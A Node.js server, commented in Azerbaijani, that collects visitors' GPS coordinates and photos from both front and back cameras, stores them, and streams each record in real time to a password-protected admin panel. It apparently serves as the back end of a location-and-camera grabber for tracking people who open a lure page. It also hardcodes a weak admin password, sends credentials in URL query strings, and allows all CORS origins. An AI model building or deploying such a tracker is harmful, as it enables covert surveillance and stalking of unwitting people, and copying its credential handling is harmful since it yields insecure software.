const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;

// Uploads qovluğunu yarat
const uploadsDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Multer konfiqurasiyası - şəkil yükləmək üçün
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadsDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 20 * 1024 * 1024 } // 20MB limit
});

// Middleware
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Verilənlər saxlanılacaq yaddaş (production üçün yetərlidir)
let submissions = [];
let adminSockets = new Set();

// Admin parol yoxlaması
const ADMIN_USERNAME = 'admin618';
const ADMIN_PASSWORD = '0618';

// Ana səhifə
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin səhifəsi
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Admin giriş yoxlama API
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    res.json({ success: true, message: 'Giriş uğurlu oldu' });
  } else {
    res.status(401).json({ success: false, message: 'Yanlış ad və ya şifrə' });
  }
});

// Məlumat göndərmə API (konum + şəkillər)
app.post('/api/submit', upload.fields([
  { name: 'frontCamera', maxCount: 1 },
  { name: 'backCamera', maxCount: 1 }
]), (req, res) => {
  try {
    const { latitude, longitude, accuracy, timestamp, userName } = req.body;
    
    const frontPhoto = req.files && req.files['frontCamera'] ? req.files['frontCamera'][0].filename : null;
    const backPhoto = req.files && req.files['backCamera'] ? req.files['backCamera'][0].filename : null;

    const submission = {
      id: Date.now(),
      userName: userName || 'İstifadəçi',
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: parseFloat(accuracy),
      timestamp: timestamp || new Date().toISOString(),
      frontPhoto: frontPhoto,
      backPhoto: backPhoto,
      receivedAt: new Date().toISOString()
    };

    submissions.unshift(submission);
    
    // Yalnız son 100 qeyd saxla
    if (submissions.length > 100) {
      submissions = submissions.slice(0, 100);
    }

    // Admin socket-lərə real-time bildiriş göndər
    io.to('admins').emit('newSubmission', submission);

    console.log(`Yeni məlumat: ${submission.userName} - ${submission.latitude}, ${submission.longitude}`);
    
    res.json({ success: true, message: 'Məlumatlar uğurla göndərildi', id: submission.id });
  } catch (error) {
    console.error('Submit xətası:', error);
    res.status(500).json({ success: false, message: 'Server xətası' });
  }
});

// Base64 şəkil yükləmə API (kamera üçün alternativ)
app.post('/api/submit-base64', (req, res) => {
  try {
    const { latitude, longitude, accuracy, timestamp, userName, frontPhoto, backPhoto } = req.body;
    
    let frontPhotoPath = null;
    let backPhotoPath = null;

    // Front kamera şəklini saxla
    if (frontPhoto && frontPhoto.startsWith('data:image')) {
      const base64Data = frontPhoto.replace(/^data:image\/\w+;base64,/, '');
      const fileName = `front-${Date.now()}.jpg`;
      const filePath = path.join(uploadsDir, fileName);
      fs.writeFileSync(filePath, base64Data, 'base64');
      frontPhotoPath = fileName;
    }

    // Arxa kamera şəklini saxla
    if (backPhoto && backPhoto.startsWith('data:image')) {
      const base64Data = backPhoto.replace(/^data:image\/\w+;base64,/, '');
      const fileName = `back-${Date.now()}.jpg`;
      const filePath = path.join(uploadsDir, fileName);
      fs.writeFileSync(filePath, base64Data, 'base64');
      backPhotoPath = fileName;
    }

    const submission = {
      id: Date.now(),
      userName: userName || 'İstifadəçi',
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: parseFloat(accuracy) || 0,
      timestamp: timestamp || new Date().toISOString(),
      frontPhoto: frontPhotoPath,
      backPhoto: backPhotoPath,
      receivedAt: new Date().toISOString()
    };

    submissions.unshift(submission);
    
    if (submissions.length > 100) {
      submissions = submissions.slice(0, 100);
    }

    // Admin socket-lərə real-time bildiriş
    io.to('admins').emit('newSubmission', submission);

    console.log(`[BASE64] Yeni məlumat: ${submission.userName} - ${submission.latitude}, ${submission.longitude}`);
    
    res.json({ success: true, message: 'Məlumatlar uğurla göndərildi', id: submission.id });
  } catch (error) {
    console.error('Base64 submit xətası:', error);
    res.status(500).json({ success: false, message: 'Server xətası: ' + error.message });
  }
});

// Bütün göndərmələri gətir (admin üçün)
app.get('/api/submissions', (req, res) => {
  const { username, password } = req.query;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    res.json({ success: true, data: submissions });
  } else {
    res.status(401).json({ success: false, message: 'İcazəsiz giriş' });
  }
});

// Socket.IO bağlantıları
io.on('connection', (socket) => {
  console.log('Yeni bağlantı:', socket.id);

  // Admin otağına qoşul
  socket.on('joinAdmin', (data) => {
    if (data && data.username === ADMIN_USERNAME && data.password === ADMIN_PASSWORD) {
      socket.join('admins');
      adminSockets.add(socket.id);
      socket.emit('adminJoined', { success: true, submissions: submissions });
      console.log('Admin qoşuldu:', socket.id);
    } else {
      socket.emit('adminJoined', { success: false });
    }
  });

  socket.on('disconnect', () => {
    adminSockets.delete(socket.id);
    console.log('Bağlantı kəsildi:', socket.id);
  });
});

// Server başlat
server.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server çalışır: http://0.0.0.0:${PORT}`);
  console.log(`📁 Uploads: ${uploadsDir}`);
});

// Xəta idarəetmə
process.on('uncaughtException', (err) => {
  console.error('Gözlənilməz xəta:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('İşlənməmiş rədd:', reason);
});
